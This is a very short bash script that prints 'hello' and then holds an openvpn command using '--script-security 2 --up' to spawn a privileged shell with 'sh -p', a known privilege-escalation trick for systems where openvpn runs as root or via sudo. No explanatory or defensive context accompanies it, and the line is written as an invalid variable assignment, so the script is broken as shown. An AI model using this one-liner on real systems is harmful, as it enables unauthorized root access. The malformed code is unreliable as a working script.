#!/usr/bin/bash

echo 'hello' 
data = openvpn --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'
